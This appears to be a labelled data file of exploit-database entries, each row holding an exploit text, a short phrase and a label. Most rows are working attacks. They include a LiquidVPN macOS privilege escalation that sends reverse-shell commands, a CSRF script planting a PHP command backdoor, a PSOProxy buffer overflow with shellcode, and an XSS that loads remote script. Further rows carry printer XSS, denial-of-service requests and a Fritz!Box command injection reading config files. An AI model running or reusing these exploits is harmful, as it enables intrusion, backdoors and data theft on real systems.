call to popen() as an argument.   2) ""openvpncmd"" Privilege Escalation (reserved CVE-2018-18856)  Similar to the previous vulnerability, the service checks if the ""openvpn"" parameter exists. If it does, the ""openvpncmd"" parameter is extracted and passed on to a system() call as an argument:  ============================================================================================ ... __text:00000001000013F1                 lea     rsi, aOpenvpncmd ; ""openvpncmd"" __text:00000001000013F8                 mov     rdi, rbx __text:00000001000013FB                 call    _xpc_dictionary_get_string ... __text:000000010000166A                 mov     rdi, r15        ; char * __text:000000010000166D                 call    _system __text:0000000100001672                 lea     rsi, aReply     ; ""reply"" __text:0000000100001679                 lea     rdx, aOpenvpnCommand ; ""openvpn command executed (ver 3)"" __text:0000000100001680                 mov     rdi, r12 __text:0000000100001683                 call    _xpc_dictionary_set_string ... ============================================================================================  3) OS Command Injection (reserved CVE-2018-18858)  If the service detects the ""openvpn"" parameter in a message, it also checks if the parameters  ""tun_path"" or ""tap_path"" exist. If one of them (or both) are found, the values are used as source paths for a copy process using the system() function. However, the paths are not sanitized before being passed to system():  ============================================================================================ ... __text:00000001000013CD                 lea     rsi, aPathTun   ; ""path_tun"" __text:00000001000013D4                 mov     rdi, rbx __text:00000001000013D7                 call    _xpc_dictionary_get_string __text:00000001000013DC                 mov     r14, rax __text:00000001000013DF                 lea     rsi, aPathTap   ; ""path_tap"" __text:00000001000013E6                 mov     rdi, rbx __text:00000001000013E9                 call    _xpc_dictionary_get_string ... __text:000000010000143F                 call    _strcat __text:0000000100001444                 mov     rdi, rbx        ; char * __text:0000000100001447                 call    _strlen ... __text:0000000100001497                 mov     rdi, rbx        ; char * __text:000000010000149A                 call    _system .. ============================================================================================  4) Loading of arbitrary Kernel Extensions (reserved CVE-2018-18859)  The previous vulnerability can also be used to directly install an arbitrary kernel extension. When the client is installed, ""tun_path"" and ""tap_path"" are pointed to the application folder for installing ""/Applications/LiquidVPN.app/Contents/Resources/tun.kext"" and ""/Applications/LiquidVPN.app/Contents/Resources/tap.kext"". By crafting an XPC message containing attacker controlled kernel extension paths, the helper tool installs the kernel  extensions using a call to the system function kextload(). Note: Since MacOS 10.13, a Kext needs to be signed. In adddition to that, Apple introduced user-approval for installing third party kernel extensions. However, as an attacker has local access to the system and user-approval does not require the user to enter a root or admin password, this is not a problem.   Proof of concept: ----------------- The following proof of concepts can be used to execute arbitrary system commands:  1) ""anycmd"" Privilege Escalation  ============================================================================================ ... xpc_dictionary_set_string(message, ""cmd"", ""anycmd""); xpc_dictionary_set_bool(message, ""blocking"", FALSE); xpc_dictionary_set_string(message, ""command_line"", ""[ARBITRARY CMD]""); ... ============================================================================================  2) ""openvpncmd"" Privilege Escalation  ============================================================================================ ... xpc_dictionary_set_string(message, ""cmd"", ""openvpn""); xpc_dictionary_set_string(message, ""openvpncmd"", ""[ARBITRARY CMD]""); ... ============================================================================================  3) OS Command Injection  ============================================================================================ ... xpc_dictionary_set_string(message, ""cmd"", ""openvpn""); xpc_dictionary_set_string(message, ""path_tun"", ""/tmp/__dummy00_;[ARBITRARY CMD]""); ... ============================================================================================  4) Loading of arbitrary Kernel Extensions  ============================================================================================ ... xpc_dictionary_set_string(message, ""cmd"", ""openvpn""); xpc_dictionary_set_string(message, ""path_tun"", ""[PATH TO KEXT]""); ... ============================================================================================   Vulnerable / tested versions: ----------------------------- The following version has been tested and found to be vulnerable: 1.37 (most recent) and 1.36.  Earlier versions might be vulnerable as well.   Vendor contact timeline: ------------------------ 2018-10-04: Requested security contact via twitter @LiquidVPN 2018-10-11: Contacted vendor through dave@liquidvpn.com 2018-10-11: Sent PGP encrypted advisory ( https://my.liquidvpn.com/canary/syswan) 2018-10-17: Requested status update from vendor 2018-10-30: Sent new contact details & public PGP key to dave@liquidvpn.com 2018-10-30: Received vendor notification:             No patches will be issued as the LiquidVPN client for MacOS will be             replaced by new app in the future 2018-10-31: Published to Full Disclosure Mailing List  Solution: --------- None.   Workaround: ----------- None.   EOF B. Leitner / @2018 */  // start netcat listener on port 9999  #include <stdio.h> #include <sys/stat.h> #include <sys/types.h> #include <xpc/xpc.h>  void what(const char *bin) {     printf(""%s <1-4>\n"", bin);     printf(""[1] Privesc (local reverse shell on port 9999 via \""anycmd\"")\n"");     printf(""[2] Privesc (local reverse shell on port 9999 via \""openvpncmd\"")\n"");     printf(""[3] Privesc (local reverse shell on port 9999 via OS command injection)\n"");     printf(""[4] KEXT (load arbitrary kernel extension from /tmp/tun.kext (has to be signed for MacOS >= 10.13))\n""); }   int main(int argc, const char *argv[]) {      if (argc == 1 || argc > 2) {         what(argv[0]);         return 0;     }      int option = atoi(argv[1]);     xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);      switch(option) {         case 1:             // ""anycmd""             xpc_dictionary_set_string(message, ""cmd"", ""anycmd"");             xpc_dictionary_set_bool(message, ""blocking"", FALSE);             xpc_dictionary_set_string(message, ""command_line"", ""bash -i >& /dev/tcp/127.0.0.1/9999 0>&1"");             break;         case 2:             // ""openvpncmd""             xpc_dictionary_set_string(message, ""cmd"", ""openvpn"");             xpc_dictionary_set_string(message, ""openvpncmd"", ""bash -i >& /dev/tcp/127.0.0.1/9999 0>&1"");             break;         case 3:             // cmd injection via ""path_tun"". ""path_tap"" is affected by the same bug             mkdir(""/tmp/__dummy00_"", 0755);             xpc_dictionary_set_string(message, ""cmd"", ""openvpn"");             xpc_dictionary_set_string(message, ""path_tun"", ""/tmp/__dummy00_;bash -i >& /dev/tcp/127.0.0.1/9999 0>&1;cat"");             rmdir(""/tmp/__dummy00_"");             break;         case 4:             // load arbitrary kext via ""path_tun"". ""path_tap"" is affected by the same bug             xpc_dictionary_set_string(message, ""cmd"", ""openvpn"");             xpc_dictionary_set_string(message, ""path_tun"", ""/tmp/tun.kext"");             break;         default:             what(argv[0]);             return 0;     }      printf(""[+] sending xpc message.\n"");      xpc_connection_t connection = xpc_connection_create_mach_service(""com.smr.liquidvpn.OVPNHelper"", NULL, 0);     if (connection == NULL) {         printf(""[-] connection to xpc service failed.\n"");         return 1;     }      xpc_connection_set_event_handler(connection, ^(xpc_object_t e) {         // we don't need that here.     });      xpc_connection_resume(connection);      printf(""[+] check your listener.\n"");     xpc_object_t result = xpc_connection_send_message_with_reply_sync(connection, message);      printf(""[+] bye.\n"");      return 0; }",an installation of the LiquidVPN,1
37712,"phpFileManager 0.9.8 - Cross-Site Request Forgery # Exploit Title: CSRF Remote Backdoor Shell # Google Dork: intitle: CSRF Remote Backdoor Shell # Date: 2015-07-29 # Exploit Author:  John Page ( hyp3rlinx ) # Website: hyp3rlinx.altervista.org # Vendor Homepage: phpfm.sourceforge.net # Software Link:  phpfm.sourceforge.net # Version: 0.9.8 # Tested on: windows 7 SP1 # Category: Webapps     Vendor: ================================ phpfm.sourceforge.net    Product: ============================ phpFileManager version 0.9.8   Vulnerability Type: ========================== CSRF Remote Backdoor Shell    CVE Reference: ============== N/A    Advisory Information: ======================================== CSRF Remote Backdoor Shell Vulnerability     Vulnerability Details: ======================================================================= PHP File Manager is vulnerable to creation of arbitrary files on server via CSRF which we can use to create remote backdoor shell access if victim clicks our malicious linx or visits our malicious webpages.  To create backdoor shell we will need to execute two POST requests 1- to create PHP backdoor shell 666.php 2- inject code and save to the backdoor we just created  e.g. https://localhost/phpFileManager-0.9.8/666.php?cmd=[ OS command ]   Exploit code(s): ===============  <script> var scripto=""frame=3&action=2&dir_dest=2&chmod_arg=&cmd_arg=666.php&current_dir=&selected_dir_list=&selected_file_list="" blasphemer(scripto)  var maliciouso=""action=7&save_file=1&current_dir=.&filename=666.php&file_data='<?php+echo+'backdoor shell by hyp3rlinx......';+exec($_GET['cmd']);+?>"" blasphemer(maliciouso)  function blasphemer(payload){  var xhr=new XMLHttpRequest()  xhr.open('POST',""https://localhost/phpFileManager-0.9.8/index.php"", true)  xhr.setRequestHeader(""content-type"", ""application/x-www-form-urlencoded"")  xhr.send(payload) } </script>    Disclosure Timeline: ========================================================= Vendor Notification: July 28, 2015 July 29, 2015 : Public Disclosure    Severity Level: ========================================================= High    Description: ==========================================================   Request Method(s):              [+] POST   Vulnerable Product:             [+] phpFileManager 0.9.8   Vulnerable Parameter(s):        [+] action, cmd_arg, file_data, chmod_arg, save_file   Affected Area(s):               [+] Web Server   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.   by hyp3rlinx",our malicious link,1
23733,"PSOProxy 0.91 - Remote Buffer Overflow (2) // source: https://www.securityfocus.com/bid/9706/info   It has been reported that PSOProxy is prone to a remote buffer overflow vulnerability. The issue is due to the insufficient boundary checking.   A malicious user may exploit this condition to potentially corrupt sensitive process memory in the affected process and ultimately execute arbitrary code with the privileges of the web server.   /*  * PSOProxy remote stack-based overflow  * by Li0n7@voila.fr  * Bug found by Donato Ferrante <fdonato@autistici.org>  * Spawns cmd.exe on port 9191  *  * usage: ./PSOProxy-exp -h <victim> -p <port> -t <target>  * Platforms supported are:  *     0 - XP SP1 FR - PSOProxy 0.91 - 0x77d615b9  *  * $./PSOProxy-exp -h 192.168.0.1 -p 8080 -t 0  * PSOProxy <= 0.91 remote exploit  * Bug found by Donato Ferrante <fdonato@autistici.org>  * Exploit written by Li0n7 <Li0n7@voila.fr>  *  * [+] Connected to 192.168.0.1:8080.  * [+] Building evil string to send (0x77d615b9).  * [+] Here's your shell, have fun!  * Microsoft Windows XP [version 5.1.2600]  * (C) Copyright 1985-2001 Microsoft Corp.  *  * C:\Program Files\psoproxy-x86-win32-0.91>  *  */  #include <stdio.h> #include <unistd.h> #include <netdb.h> #include <netinet/in.h> #include <errno.h> #include <fcntl.h>  #define BACK         9191 #define D_PORT       8080 #define SIZE         2048 #define JMP_ESP      0x77D4643D // USER32.DLL JMP ESP addr  //ripped shellcode from ?  char shellcode[] =  ""\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33""   ""\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C""   ""\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE""   ""\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB""   ""\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77""   ""\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77""   ""\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77""   ""\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77""   ""\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77""   ""\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77""   ""\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77""   ""\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77""   ""\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77""   ""\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB""   ""\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C""   ""\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0""   ""\x8A\x88\xAB\x6F\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77""   ""\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0""   ""\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB""   ""\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5""   ""\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98""   ""\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE""   ""\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77""   ""\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8""   ""\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF""   ""\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90""   ""\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74""   ""\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4""   ""\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94""   ""\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5""   ""\xD3\x4A\x8C\x88"";  struct os_ret_addr {       int num;       char *plat;       long ret; };  struct os_ret_addr exp_os[]= { {0,""XP SP1 FR - PSOProxy 0.91"", 0x77D615B9}, // USER32.DLL jmp esp addr {0,NULL,0}, };  char *build(long ret); int back_connection(long host); void send_evil(int fd,char evil[]); int set_connection(long host,int port); long resolve_host(u_char *host_name); void die(char *argv);  int main(int argc,char *argv[]) {       int i, option, fd, port = D_PORT;       long host = 0, ret = JMP_ESP;       char * option_list = ""h:p:t:"", buffer[SIZE];        opterr = 0;        fprintf(stdout,""PSOProxy <= 0.91 remote exploit\r\n"");       fprintf(stdout,""Bug found by Donato Ferrante <fdonato@autistici.org>\r\n"");       fprintf(stdout,""Exploit written by Li0n7 <Li0n7@voila.fr>\r\n\n"");        if (argc < 2) die(argv[0]);        while((option = getopt(argc,argv,option_list)) != -1)           switch(option)           {               case 'h':                   host = resolve_host(optarg);                   if(!host)                   {                       fprintf(stderr,""[-] Host address incorrect.\n"");                       exit(0);                   }                   break;               case 'p':                   port = atoi(optarg);                   if(port > 65535 || port < 0) exit(1);                   break;               case 't':                   for(i=0; exp_os[i].plat != NULL; i++)                   if(atoi(optarg) > i || atoi(optarg) < 0)                   {                       fprintf(stderr,""Platforms supported are:\n"");                       for(i=0; exp_os[i].plat != NULL; i++)                           fprintf(stderr,""\t%i - %s - 0x%x\n"",i,exp_os[i].plat,exp_os[i].ret);                           exit(1);                   }                   ret = exp_os[atoi(optarg)].ret;                   break;               case '?':                   fprintf(stderr,""[-] option \'%c\' unknown\n"",optopt);                   die(argv[0]);           }        fd = set_connection(host,port);       strncpy(buffer,build(ret),SIZE-1);       buffer[SIZE-1] = '\0';       send_evil(fd,buffer);       back_connection(host);       return 0; }  char *build(long ret) {       char *buffer,*ptr,*request;       int i;       long *addr_ptr;        fprintf(stdout,""[+] Building evil string to send (0x%x).\n"",ret);       buffer = (char *)malloc(SIZE);       request = (char *)malloc(SIZE+4);        if(!buffer || !request)       {           fprintf(stderr,""[-] Can't allocate memory, exiting...\n"");           exit(0);       }        ptr = buffer;       memset(ptr,0x41,1024);       ptr += 1024;        addr_ptr = (long *)ptr;       *(addr_ptr++) = ret;       ptr = (char *)addr_ptr;        memset(ptr,0x90,20);       ptr += 20;       memcpy(ptr,shellcode,strlen(shellcode));       ptr += strlen(shellcode);        snprintf(request,SIZE+64,""%s\r\n"",buffer);       return request; }   int back_connection(long host) {       struct sockaddr_in s;       u_char sock_buf[4096];       fd_set fds;       int fd,size;       char *command=""ver\n"";        fd = socket(AF_INET, SOCK_STREAM, 0);       if (fd < 0)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           exit(0);       }        s.sin_family = AF_INET;       s.sin_port   = htons(BACK);       s.sin_addr.s_addr = host;        if (connect(fd, (struct sockaddr *)&s, sizeof(struct sockaddr)) == -1)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           close(fd);           return 0;       }        fprintf(stdout, ""[+] Here's your shell, have fun!\n\n"");        size = send(fd, command, strlen(command), 0);       if(size < 0)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           close(fd);           exit(0);       }        for (;;)       {           FD_ZERO(&fds);           FD_SET(0, &fds);           FD_SET(fd, &fds);            if (select(255, &fds, NULL, NULL, NULL) == -1)           {               fprintf(stderr,""[-] %s\n"",strerror(errno));               close(fd);               exit(0);           }            memset(sock_buf, 0, sizeof(sock_buf));            if (FD_ISSET(fd, &fds))           {               if (recv(fd, sock_buf, sizeof(sock_buf), 0) == -1)               {                   fprintf(stderr, ""[-] Connection closed by remote host.\n"");                   close(fd);                   exit(0);               }                fprintf(stderr, ""%s"", sock_buf);           }            if (FD_ISSET(0, &fds))           {               read(0, sock_buf, sizeof(sock_buf));               write(fd, sock_buf, strlen(sock_buf));           }       }       return 0; }  void send_evil(int fd,char evil[SIZE+64]) {       int size;       size = send(fd, evil, strlen(evil), 0);       if(size < 0)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           close(fd);           exit(0);       }       sleep(1);       return; }   int set_connection(long host,int port) {       struct sockaddr_in s;       struct hostent * hoste;       int fd,size;        fd = socket(AF_INET,SOCK_STREAM,0);       if(fd < 0)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           exit(0);       }        s.sin_family = AF_INET;       s.sin_addr.s_addr = host;       s.sin_port = htons(port);        if(connect(fd,(struct sockaddr *)&s,sizeof(s)) == -1)       {           fprintf(stderr,""[-] %s\n"",strerror(errno));           close(fd);           exit(0);       }        fprintf(stdout,""[+] Connected to %s:%i.\n"",inet_ntoa(s.sin_addr.s_addr),port);        sleep(1);       return fd;  }  long resolve_host(u_char *host_name) {       struct in_addr addr;       struct hostent *host_ent;        addr.s_addr = inet_addr(host_name);       if (addr.s_addr == -1)       {           host_ent = gethostbyname(host_name);           if (!host_ent) return(0);           memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);       }        return(addr.s_addr); }  void die(char *argv) {       int i;       fprintf(stdout,""usage: %s -h <victim> -p <port> -t <target>\n"",argv);       fprintf(stderr,""Platforms supported are:\n"");       for(i=0; exp_os[i].plat != NULL; i++)           fprintf(stderr,""\t%i - %s - 0x%x\n"",i,exp_os[i].plat,exp_os[i].ret);       exit(1); }  /* A poil! */",A malicious user,1
44839,"Brother HL Series Printers 1.15 - Cross-Site Scripting # Exploit Title: [ XSS at Brother HL series printers]    # Date: [30.05.2018]   # Exploit Author: [Huy Kha]  # Vendor Homepage: [http://support.brother.com]   # Software Link: [ Website ]   # Version: Brother HL series printers.  # Tested on: Mozilla FireFox    # Reflected XSS Payload :  ""--!><Svg/OnLoad=(confirm)(1)>""  # Description : Starting searching for printers without having a password.  When you see a yellow bar with ''Configure the password'' you can take over the full printer by putting a password on it.   # PoC : If you want to execute the XSS you need to be loged into the web interface first.   # Example :  1. Go to the following url: http://127.0.0.1/ 2. Login with ''admin'' as password 3. Intercept now the request with Burpsuite 4. The XSS exist in the loginerror.html?url= parameter  4. Demo URL: http://127.0.0.1/etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241   # Request :  GET /etc/loginerror.html?url=%2Fnet%2Fnet%2Fservice_detail.html%3Fservice%3D%2522--!%253E%253CSvg%2FOnLoad%3D(confirm)(1)%253E%2522%26pageid%3D241 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: nl,en-US;q=0.7,en;q=0.3 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0   # Response :  HTTP/1.1 200 OK Cache-Control: no-cache Content-Length: 3389 Content-Type: text/html Content-Language: nl Connection: close Server: debut/1.20 Pragma: no-cache  <?xml version=""1.0"" encoding=""iso-8859-1""?><!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""><html lang=""nl"" xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""nl""><head><meta http-equiv=""Content-Script-Type"" content=""text/javascript"" /><meta http-equiv=""content-style-type"" content=""text/css"" /><meta http-equiv=""Content-Type"" content=""text/html; charset=iso-8859-1"" /><script type=""text/javascript"" src=""/common/js/ews.js""></script>  <link rel=""stylesheet"" type=""text/css"" href=""../common/css/common.css"" />   <link rel=""stylesheet"" type=""text/css"" href=""../common/css/ews.css"" /><title>Brother HL-L2340D series</title></head><body><div id=""baseFrame""><div id=""frameContainer""><div id=""headerFrameContainerLeft""><div id=""headerFrameContainerRight""><div id=""headerFrameInner""><div id=""headerFrame""><div id=""modelName""><h1>HL-L2340D series</h1><div class=""SetBox"" id=""SetBoxAuthRight""><div id=""SetBoxAuthLeft""><form method=""post"" action=""/general/status.html""><div>Log&#32;in<input type=""password"" id=""LogBox"" name=""B1d6"" /><input type=""hidden"" name=""loginurl"" value=""/net/net/service_detail.html?service=""--!><Svg/OnLoad=(confirm)(1)>""&pageid=241""/><input id=""login"" type=""submit"" value=""&nbsp;"" /></div></form></div></div></div><div id=""corporateLogo""><img src=""/common/images/logo.gif"" alt=""Brother"" /></div></div><div id=""solutions""><div><span><a href=""http://solutions.brother.com/cgi-bin/solutions.cgi?MDL=prn088&LNG=en&SRC=DEVICE"">Brother<br />Solutions&#32;Center</a></span></div></div><div id=""tabMenu""><ul><li><ul><li class=""selected""><p>Algemeen</p></li></ul></li></ul></div></div></div></div><div id=""mainFrameContainer""><div id=""mainFrameTopLeft""><div id=""mainFrameTopRight""><div id=""mainFrameTopInner""><div id=""subTabMenu"">&nbsp;</div></div></div></div><div id=""mainFrameInner""><div id=""subMenu""><div><a href=""/general/status.html"">Status</a></div><div><a href=""/general/reflesh.html"" class=""subPage"">Interval&#32;voor&#32;autom.&#32;vernieuwen</a></div><div><a href=""/general/information.html?kind=item"">Onderhoudsinformatie</a></div><div><a href=""/general/lists.html"">Lijsten/Rapporten</a></div><div><a href=""/general/find.html"">Apparaat&#32;zoeken</a></div><div><a href=""/general/contact.html"">Contactpersoon&#32;&&#32;locatie</a></div><div><a href=""/general/sleep.html"">Slaapstand</a></div><div><a href=""/general/powerdown.html"">Automatisch&#32;uitschakelen</a></div><div><a href=""/general/language.html"">Taal</a></div><div><a href=""/general/panel.html"">Paneel</a></div><div><a href=""/general/replacetoner.html"">Toner&#32;vervangen</a></div></div><div id=""rightFrameContainer""><div id=""rightFrame""><div id=""mainContent""><div id=""pageTitle""><h2>Log&#32;in</h2></div><div id=""pageContents""><div class=""contentsGroup""><p class=""noteMessage"">Om&#32;deze&#32;pagina&#32;te&#32;openen&#32;moet&#32;u&#32;inloggen.&#32;Log&#32;in&#32;s.v.p.</p></div></div></div></div></div><script type=""text/javascript""><!-- SetMinHeight(); // --></script></div><div id=""mainFrameBottomLeft""><div id=""mainFrameBottomRight""><div id=""mainFrameBottomInner""></div></div></div></div><div id=""footerFrameContainer""><div id=""copyright"">Copyright(C) 2000-2014 Brother Industries, Ltd. All Rights Reserved.</div><div id=""topBack""><a href=""#"">Top<img src=""/common/images/ic_pt.gif"" alt=""Top"" /></a></div></div></div></div></body></html>    # How to fix it? : Update the printer to Firmware 1.16 and set a new password.  # Screenshot : https://imgur.com/a/3OVTSZ4   # Note: The vendor has been contacted on 30-5-2018.",putting a password on it,1
35792,"Gadu-Gadu Instant Messenger 6.0 - File Transfer Cross-Site Scripting source: https://www.securityfocus.com/bid/47957/info  Gadu-Gadu Instant Messenger is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   file name that loads external x.js code: <input onfocus=""eval(unescape('x%3Ddocument.getElementsByTagName%28%27head%27%29.item%280%29%3By%3Ddocument.createElement%28%27script%27%29%3By.src%3D%27http:%2f%2fasd.pl%2fx.js%27%3Bx.appendChild%28y%29%3B'));this.setAttribute('onfocus',0);"" autofocus>  example x.js code to hide, accept and open every file request:  document.getElementById('extra').innerHTML = '<style>.file, .entrySeparator{display:none;}</style>'; n = document.getElementById('open_file'); n.setAttribute('id', '');  function ff(){     if(f = document.getElementById('open_file')) {         e = document.createEvent(""HTMLEvents"");         e.initEvent('click', true, true);         f.dispatchEvent(e);         f.setAttribute('id', '');     }     setTimeout('ff()', 1000); }  ff();",a specially crafted .js file,1
19977,Real Networks Real Server 7.0/7.0.1/8.0 Beta - view-source Denial of Service source: https://www.securityfocus.com/bid/1288/info  RealServer 7.0 will crash if it receives a request for a specific file with an unspecified variable value.   http://targetIP:port/viewsource/template.html?,a request for a specific file with an unspecified variable value,1
20830,T. Hauck Jana Server 1.45/1.46/2.0 - MS-DOS Device Name Denial of Service source: https://www.securityfocus.com/bid/2704/info  Versions of Jana Server are vulnerable to a denial of service attack.  It is possible to remotely crash a system running Jana Server by submitting a URL request which specifies an MS-DOS devicename.  A hard reboot of the exploited server will be required to restore web services.   www.example.com/aux,submitting a URL request which specifies an MS-DOS devicename,1
3343,"FTP Voyager 14.0.0.3 - 'CWD' Remote Stack Overflow (PoC) /*********************************************************************************** *               FTP Voyager <= 14.0.0.3 CWD Remote Stack Overflow                  * *                                                                                  * *                                                                                  * * There is a remote stack overflow in FTP Voyager triggered by a long 257 response * * After that, if the user hits <abort>.....................................B O O M * *                                                                                  * * Only a DoS, I dont think code execution is possible                              * *                                                                                  * * Have Fun!                                                                        * *                                                                                  * * Coded by Marsu <Marsupilamipowa@hotmail.fr>                                      * ***********************************************************************************/    #include ""winsock2.h"" #include ""stdio.h"" #include ""stdlib.h"" #include ""windows.h"" #pragma comment(lib, ""ws2_32.lib"")  int main(int argc, char* argv[]) { 	char recvbuff[1024]; 	char evilbuff[30000]; 	sockaddr_in sin; 	int server,client; 	WSADATA wsaData; 	WSAStartup(MAKEWORD(1,1), &wsaData);  	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); 	sin.sin_family = PF_INET; 	sin.sin_addr.s_addr = htonl(INADDR_ANY); 	sin.sin_port = htons( 21 ); 	bind(server,(SOCKADDR*)&sin,sizeof(sin)); 	printf(""[+] FTP Voyager 14.0.0.3 CWD Remote Stack Overflow\n""); 	printf(""[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n""); 	printf(""[*] Listening on port 21 ...\n""); 	listen(server,5); 	printf(""[*] Waiting for client ...\n""); 	client=accept(server,NULL,NULL); 	printf(""[+] Client connected\n"");   	memcpy(evilbuff,""220 Hello there\r\n\0"",18); 	memset(recvbuff,'\0',1024);  	if (send(client,evilbuff,strlen(evilbuff),0)==-1) 	{ 		printf(""[-] Error in send!\n""); 		exit(-1); 	}  	//USER 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""331 \r\n\0"",7); 	send(client,evilbuff,strlen(evilbuff),0); 	Sleep(50);  	//PASS 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""230 \r\n\0"",7); 	send(client,evilbuff,strlen(evilbuff),0);  	//SYST  	memset(recvbuff,'\0',1024); 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""215 WINDOWS\r\n\0"",14); 	send(client,evilbuff,strlen(evilbuff),0);  	//FEAT 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""211 END\r\n\0"",10); 	send(client,evilbuff,strlen(evilbuff),0); 	 	//REST 100 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""350 rest at 100\r\n\0"",10); 	send(client,evilbuff,strlen(evilbuff),0); 	 	//REST 0 	memset(recvbuff,'\0',1024); 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	memcpy(evilbuff,""350 rest at 0\r\n\0"",10); 	send(client,evilbuff,strlen(evilbuff),0);  	//PWD 	int i=5; 	memset(recvbuff,'\0',1024); 	recv(client,recvbuff,1024,0); 	printf(""%s"", recvbuff); 	while (i<30000) { //17000 should be enough... but chances are it is still alive =D 		memset(evilbuff+i,'a',1); 		i++; 		memset(evilbuff+i,'//',1); 		i++; 	} 	memcpy(evilbuff,""257 \"""",5); 	memcpy(evilbuff+30000,""\""\r\n\0"",4); 	printf(""[+] Wait til the user hits <abort>""); 	while(1) { //stupid loop to force the user to click disconnect. Theorically, one shot is sufficient to make the app unstable. 		if (send(client,evilbuff,strlen(evilbuff),0)==-1) break; 		Sleep(3000); 	} 	closesocket(client); 	closesocket(server);  	printf(""\n[+] VoyagerFTP is DoSed\n""); 	return 0; }  // milw0rm.com [2007-02-20]",a long 257 response,1
33136,Fritz!Box - Remote Command Execution App : Fritz!Box Author : 0x4148  Fritz!Box is Networking/voice Over ip router produced by AVM it suffer from Unauthenticated remote command execution flaw  Poc : https://ip/cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang=%26%20cat%20/var/flash/voip.cfg%20%26  #0x4148_rise,malformed tags,1
